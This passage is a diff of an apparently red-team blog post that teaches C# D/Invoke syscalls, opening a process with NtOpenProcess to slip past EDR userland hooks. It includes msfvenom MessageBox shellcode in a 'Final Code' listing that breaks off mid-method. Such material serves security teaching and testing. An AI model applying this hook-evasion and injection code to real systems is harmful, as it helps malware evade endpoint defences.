-            GuidsExhausted = <span style="color:#ae81ff">0</span>xc0000083,
-            InvalidIdAuthority = <span style="color:#ae81ff">0</span>xc0000084,
-            AgentsExhausted = <span style="color:#ae81ff">0</span>xc0000085,
-            InvalidVolumeLabel = <span style="color:#ae81ff">0</span>xc0000086,
-            SectionNotExtended = <span style="color:#ae81ff">0</span>xc0000087,
-            NotMappedData = <span style="color:#ae81ff">0</span>xc0000088,
-            ResourceDataNotFound = <span style="color:#ae81ff">0</span>xc0000089,
-            ResourceTypeNotFound = <span style="color:#ae81ff">0</span>xc000008a,
-            ResourceNameNotFound = <span style="color:#ae81ff">0</span>xc000008b,
-            ArrayBoundsExceeded = <span style="color:#ae81ff">0</span>xc000008c,
-            FloatDenormalOperand = <span style="color:#ae81ff">0</span>xc000008d,
-            FloatDivideByZero = <span style="color:#ae81ff">0</span>xc000008e,
-            FloatInexactResult = <span style="color:#ae81ff">0</span>xc000008f,
-            FloatInvalidOperation = <span style="color:#ae81ff">0</span>xc0000090,
-            FloatOverflow = <span style="color:#ae81ff">0</span>xc0000091,
-            FloatStackCheck = <span style="color:#ae81ff">0</span>xc0000092,
-            FloatUnderflow = <span style="color:#ae81ff">0</span>xc0000093,
-            IntegerDivideByZero = <span style="color:#ae81ff">0</span>xc0000094,
-            IntegerOverflow = <span style="color:#ae81ff">0</span>xc0000095,
-            PrivilegedInstruction = <span style="color:#ae81ff">0</span>xc0000096,
-            TooManyPagingFiles = <span style="color:#ae81ff">0</span>xc0000097,
-            FileInvalid = <span style="color:#ae81ff">0</span>xc0000098,
-            InsufficientResources = <span style="color:#ae81ff">0</span>xc000009a,
-            InstanceNotAvailable = <span style="color:#ae81ff">0</span>xc00000ab,
-            PipeNotAvailable = <span style="color:#ae81ff">0</span>xc00000ac,
-            InvalidPipeState = <span style="color:#ae81ff">0</span>xc00000ad,
-            PipeBusy = <span style="color:#ae81ff">0</span>xc00000ae,
-            IllegalFunction = <span style="color:#ae81ff">0</span>xc00000af,
-            PipeDisconnected = <span style="color:#ae81ff">0</span>xc00000b0,
-            PipeClosing = <span style="color:#ae81ff">0</span>xc00000b1,
-            PipeConnected = <span style="color:#ae81ff">0</span>xc00000b2,
-            PipeListening = <span style="color:#ae81ff">0</span>xc00000b3,
-            InvalidReadMode = <span style="color:#ae81ff">0</span>xc00000b4,
-            IoTimeout = <span style="color:#ae81ff">0</span>xc00000b5,
-            FileForcedClosed = <span style="color:#ae81ff">0</span>xc00000b6,
-            ProfilingNotStarted = <span style="color:#ae81ff">0</span>xc00000b7,
-            ProfilingNotStopped = <span style="color:#ae81ff">0</span>xc00000b8,
-            NotSameDevice = <span style="color:#ae81ff">0</span>xc00000d4,
-            FileRenamed = <span style="color:#ae81ff">0</span>xc00000d5,
-            CantWait = <span style="color:#ae81ff">0</span>xc00000d8,
-            PipeEmpty = <span style="color:#ae81ff">0</span>xc00000d9,
-            CantTerminateSelf = <span style="color:#ae81ff">0</span>xc00000db,
-            InternalError = <span style="color:#ae81ff">0</span>xc00000e5,
-            InvalidParameter1 = <span style="color:#ae81ff">0</span>xc00000ef,
-            InvalidParameter2 = <span style="color:#ae81ff">0</span>xc00000f0,
-            InvalidParameter3 = <span style="color:#ae81ff">0</span>xc00000f1,
-            InvalidParameter4 = <span style="color:#ae81ff">0</span>xc00000f2,
-            InvalidParameter5 = <span style="color:#ae81ff">0</span>xc00000f3,
-            InvalidParameter6 = <span style="color:#ae81ff">0</span>xc00000f4,
-            InvalidParameter7 = <span style="color:#ae81ff">0</span>xc00000f5,
-            InvalidParameter8 = <span style="color:#ae81ff">0</span>xc00000f6,
-            InvalidParameter9 = <span style="color:#ae81ff">0</span>xc00000f7,
-            InvalidParameter10 = <span style="color:#ae81ff">0</span>xc00000f8,
-            InvalidParameter11 = <span style="color:#ae81ff">0</span>xc00000f9,
-            InvalidParameter12 = <span style="color:#ae81ff">0</span>xc00000fa,
-            ProcessIsTerminating = <span style="color:#ae81ff">0</span>xc000010a,
-            MappedFileSizeZero = <span style="color:#ae81ff">0</span>xc000011e,
-            TooManyOpenedFiles = <span style="color:#ae81ff">0</span>xc000011f,
-            Cancelled = <span style="color:#ae81ff">0</span>xc0000120,
-            CannotDelete = <span style="color:#ae81ff">0</span>xc0000121,
-            InvalidComputerName = <span style="color:#ae81ff">0</span>xc0000122,
-            FileDeleted = <span style="color:#ae81ff">0</span>xc0000123,
-            SpecialAccount = <span style="color:#ae81ff">0</span>xc0000124,
-            SpecialGroup = <span style="color:#ae81ff">0</span>xc0000125,
-            SpecialUser = <span style="color:#ae81ff">0</span>xc0000126,
-            MembersPrimaryGroup = <span style="color:#ae81ff">0</span>xc0000127,
-            FileClosed = <span style="color:#ae81ff">0</span>xc0000128,
-            TooManyThreads = <span style="color:#ae81ff">0</span>xc0000129,
-            ThreadNotInProcess = <span style="color:#ae81ff">0</span>xc000012a,
-            TokenAlreadyInUse = <span style="color:#ae81ff">0</span>xc000012b,
-            PagefileQuotaExceeded = <span style="color:#ae81ff">0</span>xc000012c,
-            CommitmentLimit = <span style="color:#ae81ff">0</span>xc000012d,
-            InvalidImageLeFormat = <span style="color:#ae81ff">0</span>xc000012e,
-            InvalidImageNotMz = <span style="color:#ae81ff">0</span>xc000012f,
-            InvalidImageProtect = <span style="color:#ae81ff">0</span>xc0000130,
-            InvalidImageWin16 = <span style="color:#ae81ff">0</span>xc0000131,
-            LogonServer = <span style="color:#ae81ff">0</span>xc0000132,
-            DifferenceAtDc = <span style="color:#ae81ff">0</span>xc0000133,
-            SynchronizationRequired = <span style="color:#ae81ff">0</span>xc0000134,
-            DllNotFound = <span style="color:#ae81ff">0</span>xc0000135,
-            IoPrivilegeFailed = <span style="color:#ae81ff">0</span>xc0000137,
-            OrdinalNotFound = <span style="color:#ae81ff">0</span>xc0000138,
-            EntryPointNotFound = <span style="color:#ae81ff">0</span>xc0000139,
-            ControlCExit = <span style="color:#ae81ff">0</span>xc000013a,
-            InvalidAddress = <span style="color:#ae81ff">0</span>xc0000141,
-            PortNotSet = <span style="color:#ae81ff">0</span>xc0000353,
-            DebuggerInactive = <span style="color:#ae81ff">0</span>xc0000354,
-            CallbackBypass = <span style="color:#ae81ff">0</span>xc0000503,
-            PortClosed = <span style="color:#ae81ff">0</span>xc0000700,
-            MessageLost = <span style="color:#ae81ff">0</span>xc0000701,
-            InvalidMessage = <span style="color:#ae81ff">0</span>xc0000702,
-            RequestCanceled = <span style="color:#ae81ff">0</span>xc0000703,
-            RecursiveDispatch = <span style="color:#ae81ff">0</span>xc0000704,
-            LpcReceiveBufferExpected = <span style="color:#ae81ff">0</span>xc0000705,
-            LpcInvalidConnectionUsage = <span style="color:#ae81ff">0</span>xc0000706,
-            LpcRequestsNotAllowed = <span style="color:#ae81ff">0</span>xc0000707,
-            ResourceInUse = <span style="color:#ae81ff">0</span>xc0000708,
-            ProcessIsProtected = <span style="color:#ae81ff">0</span>xc0000712,
-            VolumeDirty = <span style="color:#ae81ff">0</span>xc0000806,
-            FileCheckedOut = <span style="color:#ae81ff">0</span>xc0000901,
-            CheckOutRequired = <span style="color:#ae81ff">0</span>xc0000902,
-            BadFileType = <span style="color:#ae81ff">0</span>xc0000903,
-            FileTooLarge = <span style="color:#ae81ff">0</span>xc0000904,
-            FormsAuthRequired = <span style="color:#ae81ff">0</span>xc0000905,
-            VirusInfected = <span style="color:#ae81ff">0</span>xc0000906,
-            VirusDeleted = <span style="color:#ae81ff">0</span>xc0000907,
-            TransactionalConflict = <span style="color:#ae81ff">0</span>xc0190001,
-            InvalidTransaction = <span style="color:#ae81ff">0</span>xc0190002,
-            TransactionNotActive = <span style="color:#ae81ff">0</span>xc0190003,
-            TmInitializationFailed = <span style="color:#ae81ff">0</span>xc0190004,
-            RmNotActive = <span style="color:#ae81ff">0</span>xc0190005,
-            RmMetadataCorrupt = <span style="color:#ae81ff">0</span>xc0190006,
-            TransactionNotJoined = <span style="color:#ae81ff">0</span>xc0190007,
-            DirectoryNotRm = <span style="color:#ae81ff">0</span>xc0190008,
-            CouldNotResizeLog = <span style="color:#ae81ff">0</span>xc0190009,
-            TransactionsUnsupportedRemote = <span style="color:#ae81ff">0</span>xc019000a,
-            LogResizeInvalidSize = <span style="color:#ae81ff">0</span>xc019000b,
-            RemoteFileVersionMismatch = <span style="color:#ae81ff">0</span>xc019000c,
-            CrmProtocolAlreadyExists = <span style="color:#ae81ff">0</span>xc019000f,
-            TransactionPropagationFailed = <span style="color:#ae81ff">0</span>xc0190010,
-            CrmProtocolNotFound = <span style="color:#ae81ff">0</span>xc0190011,
-            TransactionSuperiorExists = <span style="color:#ae81ff">0</span>xc0190012,
-            TransactionRequestNotValid = <span style="color:#ae81ff">0</span>xc0190013,
-            TransactionNotRequested = <span style="color:#ae81ff">0</span>xc0190014,
-            TransactionAlreadyAborted = <span style="color:#ae81ff">0</span>xc0190015,
-            TransactionAlreadyCommitted = <span style="color:#ae81ff">0</span>xc0190016,
-            TransactionInvalidMarshallBuffer = <span style="color:#ae81ff">0</span>xc0190017,
-            CurrentTransactionNotValid = <span style="color:#ae81ff">0</span>xc0190018,
-            LogGrowthFailed = <span style="color:#ae81ff">0</span>xc0190019,
-            ObjectNoLongerExists = <span style="color:#ae81ff">0</span>xc0190021,
-            StreamMiniversionNotFound = <span style="color:#ae81ff">0</span>xc0190022,
-            StreamMiniversionNotValid = <span style="color:#ae81ff">0</span>xc0190023,
-            MiniversionInaccessibleFromSpecifiedTransaction = <span style="color:#ae81ff">0</span>xc0190024,
-            CantOpenMiniversionWithModifyIntent = <span style="color:#ae81ff">0</span>xc0190025,
-            CantCreateMoreStreamMiniversions = <span style="color:#ae81ff">0</span>xc0190026,
-            HandleNoLongerValid = <span style="color:#ae81ff">0</span>xc0190028,
-            NoTxfMetadata = <span style="color:#ae81ff">0</span>xc0190029,
-            LogCorruptionDetected = <span style="color:#ae81ff">0</span>xc0190030,
-            CantRecoverWithHandleOpen = <span style="color:#ae81ff">0</span>xc0190031,
-            RmDisconnected = <span style="color:#ae81ff">0</span>xc0190032,
-            EnlistmentNotSuperior = <span style="color:#ae81ff">0</span>xc0190033,
-            RecoveryNotNeeded = <span style="color:#ae81ff">0</span>xc0190034,
-            RmAlreadyStarted = <span style="color:#ae81ff">0</span>xc0190035,
-            FileIdentityNotPersistent = <span style="color:#ae81ff">0</span>xc0190036,
-            CantBreakTransactionalDependency = <span style="color:#ae81ff">0</span>xc0190037,
-            CantCrossRmBoundary = <span style="color:#ae81ff">0</span>xc0190038,
-            TxfDirNotEmpty = <span style="color:#ae81ff">0</span>xc0190039,
-            IndoubtTransactionsExist = <span style="color:#ae81ff">0</span>xc019003a,
-            TmVolatile = <span style="color:#ae81ff">0</span>xc019003b,
-            RollbackTimerExpired = <span style="color:#ae81ff">0</span>xc019003c,
-            TxfAttributeCorrupt = <span style="color:#ae81ff">0</span>xc019003d,
-            EfsNotAllowedInTransaction = <span style="color:#ae81ff">0</span>xc019003e,
-            TransactionalOpenNotAllowed = <span style="color:#ae81ff">0</span>xc019003f,
-            TransactedMappingUnsupportedRemote = <span style="color:#ae81ff">0</span>xc0190040,
-            TxfMetadataAlreadyPresent = <span style="color:#ae81ff">0</span>xc0190041,
-            TransactionScopeCallbacksNotSet = <span style="color:#ae81ff">0</span>xc0190042,
-            TransactionRequiredPromotion = <span style="color:#ae81ff">0</span>xc0190043,
-            CannotExecuteFileInTransaction = <span style="color:#ae81ff">0</span>xc0190044,
-            TransactionsNotFrozen = <span style="color:#ae81ff">0</span>xc0190045,
-
-            MaximumNtStatus = <span style="color:#ae81ff">0</span>xffffffff
-        }
-    }
-}
-</code></pre></div><p>This is definately not as straight forward as using P/Invoke, but it&rsquo;s a very effective means of evading defensive products that employ userland hooking.  API Monitor does not detect the use of these APIs - but feel free to verify that for yourself!</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c#" data-lang="c#"><span style="display:flex;"><span>NtOpenProcess ntOpenProcess = (NtOpenProcess) Marshal.GetDelegateForFunctionPointer(stub, <span style="color:#66d9ef">typeof</span>(NtOpenProcess));
+</span></span></code></pre></div><p>And then call the method:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c#" data-lang="c#"><span style="display:flex;"><span>IntPtr hProcess = IntPtr.Zero;
+</span></span><span style="display:flex;"><span>OBJECT_ATTRIBUTES oa = <span style="color:#66d9ef">new</span> OBJECT_ATTRIBUTES();
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>CLIENT_ID ci = <span style="color:#66d9ef">new</span> CLIENT_ID
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    UniqueProcess = (IntPtr)<span style="color:#66d9ef">uint</span>.Parse(args[<span style="color:#ae81ff">0</span>])
+</span></span><span style="display:flex;"><span>};
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>NTSTATUS result = ntOpenProcess(
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">ref</span> hProcess,
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0x001F0FFF</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">ref</span> oa,
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">ref</span> ci);
+</span></span></code></pre></div><p>The return code should be Success and hProcess now contains a value.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c#" data-lang="c#"><span style="display:flex;"><span>result
+</span></span><span style="display:flex;"><span>Success
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>hProcess
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x00000000000003bc</span>
+</span></span></code></pre></div><h3 id="final-code">Final Code</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c#" data-lang="c#"><span style="display:flex;"><span><span style="color:#66d9ef">using</span> DInvoke.DynamicInvoke;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">using</span> System;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">using</span> System.Runtime.InteropServices;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">namespace</span> ConsoleApp1
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Program</span>
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// msfvenom -p windows/x64/messagebox EXITFUNC=thread -f csharp</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">readonly</span> <span style="color:#66d9ef">byte</span>[] _shellcode = <span style="color:#66d9ef">new</span> <span style="color:#66d9ef">byte</span>[<span style="color:#ae81ff">323</span>] {
+</span></span><span style="display:flex;"><span>            <span style="color:#ae81ff">0xfc</span>,<span style="color:#ae81ff">0x48</span>,<span style="color:#ae81ff">0x81</span>,<span style="color:#ae81ff">0xe4</span>,<span style="color:#ae81ff">0xf0</span>,<span style="color:#ae81ff">0xff</span>,<span style="color:#ae81ff">0xff</span>,<span style="color:#ae81ff">0xff</span>,<span style="color:#ae81ff">0xe8</span>,<span style="color:#ae81ff">0xd0</span>,<span style="color:#ae81ff">0x00</span>,<span style="color:#ae81ff">0x00</span>,<span style="color:#ae81ff">0x00</span>,<span style="color:#ae81ff">0x41</span>,<span style="color:#ae81ff">0x51</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#ae81ff">0x41</span>,<span style="color:#ae81ff">0x50</span>,<span style="color:#ae81ff">0x52</span>,<span style="color:#ae81ff">0x51</span>,<span style="color:#ae81ff">0x56</span>,<span style="color:#ae81ff">0x48</span>,<span style="color:#ae81ff">0x31</span>,<span style="color:#ae81ff">0xd2</span>,<span style="color:#ae81ff">0x65</span>,<span style="color:#ae81ff">0x48</span>,<span style="color:#ae81ff">0x8b</span>,<span style="color:#ae81ff">0x52</span>,<span style="color:#ae81ff">0x60</span>,<span style="color:#ae81ff">0x3e</span>,<span style="color:#ae81ff">0x48</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#ae81ff">0x8b</span>,<span style="color:#ae81ff">0x52</span>,<span style="color:#ae81ff">0x18</span>,<span style="color:#ae81ff">0x3e</span>,<span style="color:#ae81ff">0x48</span>,<span style="color:#ae81ff">0x8b</span>,<span style="color:#ae81ff">0x52</span>,<span style="color:#ae81ff">0x20</span>,<span style="color:#ae81ff">0x3e</span>,<span style="color:#ae81ff">0x48</span>,<span style="color:#ae81ff">0x8b</span>,<span style="color:#ae81ff">0x72</span>,<span style="color:#ae81ff">0x50</span>,<span style="color:#ae81ff">0x3e</span>,<span style="color:#ae81ff">0x48</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#ae81ff">0x0f</span>,<span style="color:#ae81ff">0xb7</span>,<span style="color:#ae81ff">0x4a</span>,<span style="color:#ae81ff">0x4a</span>,<span style="color:#ae81ff">0x4d</span>,<span style="color:#ae81ff">0x31</span>,<span style="color:#ae81ff">0xc9</span>,<span style="color:#ae81ff">0x48</span>,<span style="color:#ae81ff">0x31</span>,<span style="color:#ae81ff">0xc0</span>,<span style="color:#ae81ff">0xac</span>,<span style="color:#ae81ff">0x3c</span>,<span style="color:#ae81ff">0x61</span>,<span style="color:#ae81ff">0x7c</span>,<span style="color:#ae81ff">0x02</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#ae81ff">0x2c</span>,<span style="color:#ae81ff">0x20</span>,<span style="color:#ae81ff">0x41</span>,<span style="color:#ae81ff">0xc1</span>,<span style="color:#ae81ff">0xc9</span>,<span style="color:#ae81ff">0x0d</span>,<span style="color:#ae81ff">0x41</span>,<span style="color:#ae81ff">0x01</span>,<span style="color:#ae81ff">0xc1</span>,<span style="color:#ae81ff">0xe2</span>,<span style="color:#ae81ff">0xed</span>,<span style="color:#ae81ff">0x52</span>,<span style="color:#ae81ff">0x41</span>,<span style="color:#ae81ff">0x51</span>,<span style="color:#ae81ff">0x3e</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#ae81ff">0x48</span>,<span style="color:#ae81ff">0x8b</span>,<span style="color:#ae81ff">0x52</span>,<span style="color:#ae81ff">0x20</span>,<span style="color:#ae81ff">0x3e</span>,<span style="color:#ae81ff">0x8b</span>,<span style="color:#ae81ff">0x42</span>,<span style="color:#ae81ff">0x3c</span>,<span style="color:#ae81ff">0x48</span>,<span style="color:#ae81ff">0x01</span>,<span style="color:#ae81ff">0xd0</span>,<span style="color:#ae81ff">0x3e</span>,<span style="color:#ae81ff">0x8b</span>,<span style="color:#ae81ff">0x80</span>,<span style="color:#ae81ff">0x88</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#ae81ff">0x00</span>,<span style="color:#ae81ff">0x00</span>,<span style="color:#ae81ff">0x00</span>,<span style="color:#ae81ff">0x48</span>,<span style="color:#ae81ff">0x85</span>,<span style="color:#ae81ff">0xc0</span>,<span style="color:#ae81ff">0x74</span>,<span style="color:#ae81ff">0x6f</span>,<span style="color:#ae81ff">0x48</span>,<span style="color:#ae81ff">0x01</span>,<span style="color:#ae81ff">0xd0</span>,<span style="color:#ae81ff">0x50</span>,<span style="color:#ae81ff">0x3e</span>,<span style="color:#ae81ff">0x8b</span>,<span style="color:#ae81ff">0x48</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#ae81ff">0x18</span>,<span style="color:#ae81ff">0x3e</span>,<span style="color:#ae81ff">0x44</span>,<span style="color:#ae81ff">0x8b</span>,<span style="color:#ae81ff">0x40</span>,<span style="color:#ae81ff">0x20</span>,<span style="color:#ae81ff">0x49</span>,<span style="color:#ae81ff">0x01</span>,<span style="color:#ae81ff">0xd0</span>,<span style="color:#ae81ff">0xe3</span>,<span style="color:#ae81ff">0x5c</span>,<span style="color:#ae81ff">0x48</span>,<span style="color:#ae81ff">0xff</span>,<span style="color:#ae81ff">0xc9</span>,<span style="color:#ae81ff">0x3e</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#ae81ff">0x41</span>,<span style="color:#ae81ff">0x8b</span>,<span style="color:#ae81ff">0x34</span>,<span style="color:#ae81ff">0x88</span>,<span style="color:#ae81ff">0x48</span>,<span style="color:#ae81ff">0x01</span>,<span style="color:#ae81ff">0xd6</span>,<span style="color:#ae81ff">0x4d</span>,<span style="color:#ae81ff">0x31</span>,<span style="color:#ae81ff">0xc9</span>,<span style="color:#ae81ff">0x48</span>,<span style="color:#ae81ff">0x31</span>,<span style="color:#ae81ff">0xc0</span>,<span style="color:#ae81ff">0xac</span>,<span style="color:#ae81ff">0x41</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#ae81ff">0xc1</span>,<span style="color:#ae81ff">0xc9</span>,<span style="color:#ae81ff">0x0d</span>,<span style="color:#ae81ff">0x41</span>,<span style="color:#ae81ff">0x01</span>,<span style="color:#ae81ff">0xc1</span>,<span style="color:#ae81ff">0x38</span>,<span style="color:#ae81ff">0xe0</span>,<span style="color:#ae81ff">0x75</span>,<span style="color:#ae81ff">0xf1</span>,<span style="color:#ae81ff">0x3e</span>,<span style="color:#ae81ff">0x4c</span>,<span style="color:#ae81ff">0x03</span>,<span style="color:#ae81ff">0x4c</span>,<span style="color:#ae81ff">0x24</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#ae81ff">0x08</span>,<span style="color:#ae81ff">0x45</span>,<span style="color:#ae81ff">0x39</span>,<span style="color:#ae81ff">0xd1</span>,<span style="color:#ae81ff">0x75</span>,<span style="color:#ae81ff">0xd6</span>,<span style="color:#ae81ff">0x58</span>,<span style="color:#ae81ff">0x3e</span>,<span style="color:#ae81ff">0x44</span>,<span style="color:#ae81ff">0x8b</span>,<span style="color:#ae81ff">0x40</span>,<span style="color:#ae81ff">0x24</span>,<span style="color:#ae81ff">0x49</span>,<span style="color:#ae81ff">0x01</span>,<span style="color:#ae81ff">0xd0</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#ae81ff">0x66</span>,<span style="color:#ae81ff">0x3e</span>,<span style="color:#ae81ff">0x41</span>,<span style="color:#ae81ff">0x8b</span>,<span style="color:#ae81ff">0x0c</span>,<span style="color:#ae81ff">0x48</span>,<span style="color:#ae81ff">0x3e</span>,<span style="color:#ae81ff">0x44</span>,<span style="color:#ae81ff">0x8b</span>,<span style="color:#ae81ff">0x40</span>,<span style="color:#ae81ff">0x1c</span>,<span style="color:#ae81ff">0x49</span>,<span style="color:#ae81ff">0x01</span>,<span style="color:#ae81ff">0xd0</span>,<span style="color:#ae81ff">0x3e</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#ae81ff">0x41</span>,<span style="color:#ae81ff">0x8b</span>,<span style="color:#ae81ff">0x04</span>,<span style="color:#ae81ff">0x88</span>,<span style="color:#ae81ff">0x48</span>,<span style="color:#ae81ff">0x01</span>,<span style="color:#ae81ff">0xd0</span>,<span style="color:#ae81ff">0x41</span>,<span style="color:#ae81ff">0x58</span>,<span style="color:#ae81ff">0x41</span>,<span style="color:#ae81ff">0x58</span>,<span style="color:#ae81ff">0x5e</span>,<span style="color:#ae81ff">0x59</span>,<span style="color:#ae81ff">0x5a</span>,<span style="color:#ae81ff">0x41</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#ae81ff">0x58</span>,<span style="color:#ae81ff">0x41</span>,<span style="color:#ae81ff">0x59</span>,<span style="color:#ae81ff">0x41</span>,<span style="color:#ae81ff">0x5a</span>,<span style="color:#ae81ff">0x48</span>,<span style="color:#ae81ff">0x83</span>,<span style="color:#ae81ff">0xec</span>,<span style="color:#ae81ff">0x20</span>,<span style="color:#ae81ff">0x41</span>,<span style="color:#ae81ff">0x52</span>,<span style="color:#ae81ff">0xff</span>,<span style="color:#ae81ff">0xe0</span>,<span style="color:#ae81ff">0x58</span>,<span style="color:#ae81ff">0x41</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#ae81ff">0x59</span>,<span style="color:#ae81ff">0x5a</span>,<span style="color:#ae81ff">0x3e</span>,<span style="color:#ae81ff">0x48</span>,<span style="color:#ae81ff">0x8b</span>,<span style="color:#ae81ff">0x12</span>,<span style="color:#ae81ff">0xe9</span>,<span style="color:#ae81ff">0x49</span>,<span style="color:#ae81ff">0xff</span>,<span style="color:#ae81ff">0xff</span>,<span style="color:#ae81ff">0xff</span>,<span style="color:#ae81ff">0x5d</span>,<span style="color:#ae81ff">0x49</span>,<span style="color:#ae81ff">0xc7</span>,<span style="color:#ae81ff">0xc1</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#ae81ff">0x00</span>,<span style="color:#ae81ff">0x00</span>,<span style="color:#ae81ff">0x00</span>,<span style="color:#ae81ff">0x00</span>,<span style="color:#ae81ff">0x3e</span>,<span style="color:#ae81ff">0x48</span>,<span style="color:#ae81ff">0x8d</span>,<span style="color:#ae81ff">0x95</span>,<span style="color:#ae81ff">0x1a</span>,<span style="color:#ae81ff">0x01</span>,<span style="color:#ae81ff">0x00</span>,<span style="color:#ae81ff">0x00</span>,<span style="color:#ae81ff">0x3e</span>,<span style="color:#ae81ff">0x4c</span>,<span style="color:#ae81ff">0x8d</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#ae81ff">0x85</span>,<span style="color:#ae81ff">0x2b</span>,<span style="color:#ae81ff">0x01</span>,<span style="color:#ae81ff">0x00</span>,<span style="color:#ae81ff">0x00</span>,<span style="color:#ae81ff">0x48</span>,<span style="color:#ae81ff">0x31</span>,<span style="color:#ae81ff">0xc9</span>,<span style="color:#ae81ff">0x41</span>,<span style="color:#ae81ff">0xba</span>,<span style="color:#ae81ff">0x45</span>,<span style="color:#ae81ff">0x83</span>,<span style="color:#ae81ff">0x56</span>,<span style="color:#ae81ff">0x07</span>,<span style="color:#ae81ff">0xff</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#ae81ff">0xd5</span>,<span style="color:#ae81ff">0xbb</span>,<span style="color:#ae81ff">0xe0</span>,<span style="color:#ae81ff">0x1d</span>,<span style="color:#ae81ff">0x2a</span>,<span style="color:#ae81ff">0x0a</span>,<span style="color:#ae81ff">0x41</span>,<span style="color:#ae81ff">0xba</span>,<span style="color:#ae81ff">0xa6</span>,<span style="color:#ae81ff">0x95</span>,<span style="color:#ae81ff">0xbd</span>,<span style="color:#ae81ff">0x9d</span>,<span style="color:#ae81ff">0xff</span>,<span style="color:#ae81ff">0xd5</span>,<span style="color:#ae81ff">0x48</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#ae81ff">0x83</span>,<span style="color:#ae81ff">0xc4</span>,<span style="color:#ae81ff">0x28</span>,<span style="color:#ae81ff">0x3c</span>,<span style="color:#ae81ff">0x06</span>,<span style="color:#ae81ff">0x7c</span>,<span style="color:#ae81ff">0x0a</span>,<span style="color:#ae81ff">0x80</span>,<span style="color:#ae81ff">0xfb</span>,<span style="color:#ae81ff">0xe0</span>,<span style="color:#ae81ff">0x75</span>,<span style="color:#ae81ff">0x05</span>,<span style="color:#ae81ff">0xbb</span>,<span style="color:#ae81ff">0x47</span>,<span style="color:#ae81ff">0x13</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#ae81ff">0x72</span>,<span style="color:#ae81ff">0x6f</span>,<span style="color:#ae81ff">0x6a</span>,<span style="color:#ae81ff">0x00</span>,<span style="color:#ae81ff">0x59</span>,<span style="color:#ae81ff">0x41</span>,<span style="color:#ae81ff">0x89</span>,<span style="color:#ae81ff">0xda</span>,<span style="color:#ae81ff">0xff</span>,<span style="color:#ae81ff">0xd5</span>,<span style="color:#ae81ff">0x48</span>,<span style="color:#ae81ff">0x65</span>,<span style="color:#ae81ff">0x6c</span>,<span style="color:#ae81ff">0x6c</span>,<span style="color:#ae81ff">0x6f</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#ae81ff">0x2c</span>,<span style="color:#ae81ff">0x20</span>,<span style="color:#ae81ff">0x66</span>,<span style="color:#ae81ff">0x72</span>,<span style="color:#ae81ff">0x6f</span>,<span style="color:#ae81ff">0x6d</span>,<span style="color:#ae81ff">0x20</span>,<span style="color:#ae81ff">0x4d</span>,<span style="color:#ae81ff">0x53</span>,<span style="color:#ae81ff">0x46</span>,<span style="color:#ae81ff">0x21</span>,<span style="color:#ae81ff">0x00</span>,<span style="color:#ae81ff">0x4d</span>,<span style="color:#ae81ff">0x65</span>,<span style="color:#ae81ff">0x73</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#ae81ff">0x73</span>,<span style="color:#ae81ff">0x61</span>,<span style="color:#ae81ff">0x67</span>,<span style="color:#ae81ff">0x65</span>,<span style="color:#ae81ff">0x42</span>,<span style="color:#ae81ff">0x6f</span>,<span style="color:#ae81ff">0x78</span>,<span style="color:#ae81ff">0x00</span> };
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> Main(<span style="color:#66d9ef">string</span>[] args)
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// NtOpenProcess</span>
+</span></span><span style="display:flex;"><span>        IntPtr stub = Generic.GetSyscallStub(<span style="color:#e6db74">&#34;NtOpenProcess&#34;</span>);
